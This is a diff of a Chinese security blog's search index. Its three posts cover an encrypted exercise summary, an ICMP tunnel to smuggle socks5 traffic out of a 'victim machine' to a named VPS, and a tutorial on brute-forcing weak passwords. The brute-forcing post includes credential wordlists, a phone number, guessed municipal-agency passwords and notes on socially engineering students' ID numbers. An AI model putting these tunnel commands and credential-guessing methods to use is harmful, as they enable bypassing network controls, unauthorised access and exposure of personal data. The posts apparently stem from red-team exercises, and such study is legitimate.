@@ -1,26 +1,133 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-  
-    
-    <entry>
-      <title>pingtunnel搭建icmp隧道</title>
-      <link href="2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/"/>
-      <url>2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
-      
-        <content type="html"><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p><a id="more"></a><h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p><p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p><h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure><p>vps</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure><h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote><p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p><p>虚拟机测试似乎不行</p></blockquote><h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p><hr><p>最后，感谢戴哥哥和超哥的耐心解答。</p><h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>]]></content>
-      
-      
-      
-        <tags>
-            
-            <tag> 代理 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-  
-  
+<search>
+  <entry>
+    <title>hw简单总结</title>
+    <url>/2020/11/01/hw%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">您好, 这里需要密码.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="0c74de49ce30cf9f023552798d71fb1c30893faac4b9a8fb48413e1cbcb8b23c">a4f2d0ded9c3f5257dee015f6c8a3ff9f85039c40de945cebdb2e4ad6b1648c195add37f4f290a399d6e43e8c124d0945473898ed40e75faa229cd9bd6a7903ffdef9b1603dc97859027095b62ab96c9c18994c4e44d9a7ce371b6146e1b7e8882476ca80ae2cbb6c847c2cebf2ce44e475d2eb55fd65326fff8d176840c54fd35860e514e1307f583cd497def7bff069b377150db435d3c7a88041f907139fa5039d399111fcfa73dd31c73bc3a8c4b55957607eb6a796777b435dfb5a92070957e326cfeb54f607f18a7acfed8a4774bd7ea6f6f50a3200507286595effbf3d97fbb3e1bf2eecab862a6c55b5dc2be53c91e729fb9924a1756abd44caa404ef96c9a40fa298aec083d16b0a82a7bdbd10b53c565ccd2b608f2013c4c3cbdab57faab03edf5336d75058cacd145c84af1f762fd40ba5c4bc51792888b37a24ba810e7f45b56da665535c1a0dc23b2528cd289cbd9779a8b60409d26c1115da400cfc55d4c0983e32ee1a3c7d1eea02f2dd9397550a3257ede7e0efd0d056bfe35e08a3cfe751d3e2279d8a78ffb5a6153a3ff438bd8badd9541b71b2f8fdd5d184a305536297bcc9ed341b105ca0bf0441a9ca2ab37923fda2676fabe6bb7cd8aaa028a6e84cf7e3f7ef34008686186ae371149cb40aaa07dd09704fe04f49b1301e826208d05db64783a131cf00348ef9062d73494f1d6c4fec02fcc054f7fd3766d7457483c160d67b452c953b83b19c158b04e1f693cb58571814cd5891950481c014fcc84588e3406f3d162c2255c4f4078e816529448e089c9aeb87cfcfda0e1d58a6074e738dcd8382b76c90e80113420f3a04ffd523f254faf3bf6f9783e00cd0ae6f675c87f7a0babeb59ea2d56121583cbaf3dd820e2e7f43876355a0bae4a1ef2aaabcfc40b6228f1e6e7a5bc630c2bef34dd38f0c407d3389d4fed5adedf5620a83063daf0dd4dce6465bfd5ef004e17603c9b50decb156de9ce24348037b5096ab610f9a0783959149c966ba7d8c1cd94b3d1231c638c092ba0a68c3649ba91f956b4fb12d35f29ea34827dfd9d1c375df615363fc787335d9e181f82fd119d9e0e4565f471768c8d6170f886bd6f8cb50354fa3816bd8e87b75b19924a2eda259d7d81b56efe6413b8793be845ec0940f82a3b32de448d88df0388fb424524b2bde6c30075b3da9a4e71343f1798ee26b36a7ca6c308c44af25c6dcf73a409754bc8599598461a223d9548efcfc13dccfcca6eaf612da3036007767a6bdf933c7f6c5b6c9729a6a7beb25cae724f966aeb7b999a45a46531b8204a61a2192b798c5a6fc84ed12861247348fb1aa747004f63431238c0fe06839a242bf08e39fea7d3e8fa4308fc83f0e599d3442a359eb622d4f05a76aac5b026d263220dfc02c9c5faca1945384578790b5cfc3a76fee9fb76e4e800ebf5ce2878cdd20a919c541cfead2f298929d29df41d471b11d2a44f157bf38a08eebca8ce53336ca7365ebe30c0186c8bb6db7f80e646ecfba4603f9563d703ce87eb3132ebd2e31755d545cbccafd46e5894b46712560df58e457fd0acaa80398fd025c69d82263d11e73de3df7f5898d1fcf4c0d7670e7a94ebfc310c9feb23946d2edf59cdb56bc11a622a1a04b118fef81bbd4a446cdb730ad4903398e37d779cfb320c16b823bc6863badbc6adc4fd6a38708b79ce3a4442f764ae41d85256d0468dc420c70ec2f41afd8b2090ecfb45b70aa303083429904685aa126d85d94c0d139fbc1b8ad435098f1c2fe50dae74151a4f32353fd4ae1daccad7bb9d8fa4bbc9e970ef836976e5d24f5fde84eed5aa7e53002d7d4e0e105a07490b68d9699237ea37dc04b370cbc30edd7dc14a8cbb0daa0f07d1b8cf9f1f980b67a77c7b5e86892f0da5e5ad61ec667ec00c944f878938b72807c93e06db271765295e64296808759178377a4f1f7c690243974e33ce243a0a1b9aad784d6496e1f9058c21b7523d8ba4dbe8f48f0e3ad1f41f0ec20af1ea8b94a22f2949059a5f2f8032d36e6cfab8251b31bcdd9784ba2dc17c08e8621278a34340ca93024014e883ae7f49b1c27292b9137047f7136208360fc0dcfeb6e6709fadc5d03e58abe3b0a2b96fcac1f55c9c1c0f54b9756cd5a8712bf4610d8a5af46d366c51baee3738381dd2ce7fdf170c846566e207d84e0a5466c62b9f184121e483ea0509f12f4b92f8f66a49166ee866c09cf0b5cba357b5c8a5c6aaa5f95a9695d84d9c722524e6a6aba31d1b5da87eae5da725510b3f66911f45dc030f3a970de9e0f59995bfc4856fc037fb91ba1e850bf0ad1deac13cccaab7caae35081f75af0668626f665726a23aa51a3daab7d9771169d1d452ababad8c630eca81b9b1e72c37671d04ba28a550cca7fa7f063771586fe9772a3c4e6a172fd51873a368b88ccb2f2c62fcf25d6472c9d866f5170ac715873e5826ad2820f43bdd6f77b8996adc3fc7416ccbbb69935ef42c4cbc64d0af8d478541ab63cc3e87f41d6d30f215bc5fb8f688e70c561d89bc4c7afb64b73e2f68d988bb2039fec563fa15901a175d66c501325f7d047b2788ca98265206acb1426de26d665e0347f64a09a39e6d12813f40f9a2a4a2d0f5c64646258862dfcc8f54d9d740c588e365271588b46e2884f272222ab26106603929976678f5992e1ab92f8d4d6b777b8522c517f5266d08f436cbab5743e80d19218a50bf19c3553a57a6a02a3fc9340e5f3641945da72e85d1289bf059a011399bff08478affc1988e92372913008b688f416c56ae9cc00638d0924457bce6b14ff19492cf412d4298e3bd782be7564b44655c12eebcb7975cbf8fe820940afd4b4d3342deefdfbaf70bbe0404f1fe0f2121d10ac1a3528d73f1a9d98b8e5f95e1fc3bf7966c78c4f2b5edf8ba8d2e49f90baf9143a81c563bb1d02a3685b1a5259a828ba81288e271ab1ed00d01e45825397a3ded772d3af129449256297ed4db7be62fbb43790b9d4d2ffdf1f2239b162ac4b54e8a97f6e7dbdb7c535183f41f3009a0138fe43c235dc2575048dd7ee41fbb80cf4c02adb9c26dfa564eda6667c6603cb26b43611c27ff826f99a6d75ede42626e1f5e07e981a56772712c6635b595f004bc679ef904edc9eccef04340f828982981d0e22e55c41f0ee6e27e09468247c45ef59690de</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
+      <tags>
+        <tag>hw</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pingtunnel搭建icmp隧道</title>
+    <url>/2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p>
+<a id="more"></a>
+
+<h4 id="二、原理及工具"><a href="#二、原理及工具" class="headerlink" title="二、原理及工具"></a>二、原理及工具</h4><p>pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具。用于突破网络封锁，或是绕过WIFI网络的登陆验证，或是在某些网络加快网络传输速度。</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1gk7rx68q2cj30xs0hg7bw.jpg" alt="image-20201030232122100"></p>
+<h4 id="三、隧道搭建"><a href="#三、隧道搭建" class="headerlink" title="三、隧道搭建"></a>三、隧道搭建</h4><h5 id="1、建立ICMP通道"><a href="#1、建立ICMP通道" class="headerlink" title="1、建立ICMP通道"></a>1、建立ICMP通道</h5><p>受害机</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">F:\TEMP\pingtunnel32.exe -type client -l :4455 -s 118.178.88.46 -sock5 1</span><br></pre></td></tr></table></figure>
+
+<p>vps</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"><a href="#2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）" class="headerlink" title="2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）"></a>2、确认socks5流量封装成ICMP并转发，测试出网（可忽略）</h5><blockquote>
+<p>别用IE的套接字当做socks5代理，proxifier全局代理或者浏览器socks5插件</p>
+<p>虚拟机测试似乎不行</p>
+</blockquote>
+<h5 id="3、开启frp代理"><a href="#3、开启frp代理" class="headerlink" title="3、开启frp代理"></a>3、开启frp代理</h5><p>Frpc.ini</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 118.178.88.46</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">http_proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:4455</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 6667</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure>
+
+<p>这里的关键是frp去连接服务端时需要配置本地socks5代理。</p>
+<hr>
+<p>最后，感谢戴哥哥和超哥的耐心解答。</p>
+<h4 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h4><p><a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
+]]></content>
+      <tags>
+        <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>浅谈弱口令爆破思路</title>
+    <url>/2020/10/31/%E6%B5%85%E8%B0%88%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E6%80%9D%E8%B7%AF/</url>
+    <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>无论是内网渗透还是外网渗透，无论是web应用还是ssh、rdp、mysql等常见应用，弱口令爆破都是<strong>值得</strong>尝试的一个途径。</p>
+<a id="more"></a>
+
+<h4 id="二、字典"><a href="#二、字典" class="headerlink" title="二、字典"></a>二、字典</h4><p>字典决定了弱口令爆破的成功与否，字典分为用户名和密码。</p>
+<p>在近几次开展的攻防演戏活动中，整理了爆破成功的大概下面几种类型。</p>
+<h5 id="1、用户名"><a href="#1、用户名" class="headerlink" title="1、用户名"></a>1、用户名</h5><p>常见用户名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">administrator</span><br><span class="line">admin</span><br><span class="line">Admin</span><br><span class="line">scacdmin</span><br><span class="line">strong</span><br><span class="line">user</span><br><span class="line">test</span><br><span class="line">test1</span><br><span class="line">john</span><br></pre></td></tr></table></figure>
+
+<p>数字</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">9</span><br><span class="line">123</span><br><span class="line">860</span><br></pre></td></tr></table></figure>
+
+<p>手机号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17865154061</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>收集那个地区的手机号进行爆破</p>
+<p>社工公司内部员工</p>
+</blockquote>
+<p>姓名拼音</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yanli</span><br><span class="line">dj_yao</span><br><span class="line">yanshi</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>P牛的星球看到的：大型公司（员工数量5k+），可以根据中国姓名拼音Top500来做</p>
+<p>对于千人及以下的中小型创业公司，企查查和爱企查爬一下这个公司的专利信息列表</p>
+</blockquote>
+<blockquote>
+<p>使用下面的项目字典生成很简单</p>
+<p><a href="https://github.com/LandGrey/ChineseMaskReflector">https://github.com/LandGrey/ChineseMaskReflector</a></p>
+<p>目前我的字典包含如下（中国姓名top500），孙大圣为例</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sundasheng</span><br><span class="line">sunds</span><br><span class="line">dssun</span><br><span class="line">sds</span><br><span class="line">ds_sun</span><br><span class="line">dashengsun</span><br><span class="line">Sundasheng</span><br><span class="line">Sds</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上面的也可以用到自定义密码生成中</p>
+</blockquote>
+<p>域名、地域名、机关名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>关键</p>
+</blockquote>
+<h5 id="2、密码"><a href="#2、密码" class="headerlink" title="2、密码"></a>2、密码</h5><p>常见密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">123456</span><br><span class="line">admin</span><br><span class="line">manage</span><br><span class="line">strong</span><br><span class="line">11111</span><br><span class="line">admin123!</span><br><span class="line">12345678;abc</span><br><span class="line">12345!@#$%abc</span><br><span class="line">Passw0rd</span><br><span class="line">p@ssword</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>自定义</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Admin&#x2F;Cx123456（cx市）</span><br><span class="line">xzadmin&#x2F;xz@123456（xz市）</span><br><span class="line">strong&#x2F;yyslj!@#123（yy市水利局）</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a></p>
+</blockquote>
+<p>先写入data.txt</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhejiang</span><br><span class="line">243536998</span><br><span class="line">sundasheng</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python pydictor.py -extend data.txt --level 3 --len 4 16</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>另外一个更加自定义的工具</p>
+<p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases/tag/v1.1</a></p>
+<p>使用参考：<a href="https://www.cnblogs.com/cwkiller/p/12741086.html">https://www.cnblogs.com/cwkiller/p/12741086.html</a></p>
+</blockquote>
+<h4 id="三、爆破思路"><a href="#三、爆破思路" class="headerlink" title="三、爆破思路"></a>三、爆破思路</h4><p>1、固定用户名爆破密码</p>
+<p><code>admin</code></p>
+<p>2、固定密码爆破用户名</p>
+<p><code>123456</code></p>
+<p>3、验证码对抗</p>
+<p><code>Captcha-killer</code>插件</p>
+<h4 id="四、真实案例"><a href="#四、真实案例" class="headerlink" title="四、真实案例"></a>四、真实案例</h4><h5 id="1、学校VPN"><a href="#1、学校VPN" class="headerlink" title="1、学校VPN"></a>1、学校VPN</h5><p>微博超话获取到了学生的vpn账号</p>
+<p>入学通知获取到了姓名、学号，社工获取身份证号</p>
+<h5 id="2、离线爆破"><a href="#2、离线爆破" class="headerlink" title="2、离线爆破"></a>2、离线爆破</h5><p>一次实战中sql注入得到了后台账号密码，加盐md5，但是只解出了一组为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin1&#x2F;admin123!</span><br></pre></td></tr></table></figure>
+
+<p>根据域名等信息，并根据上面的格式生成字典爆破出</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#x2F;*****123!</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <tags>
+        <tag>爆破</tag>
+      </tags>
+  </entry>
 </search>
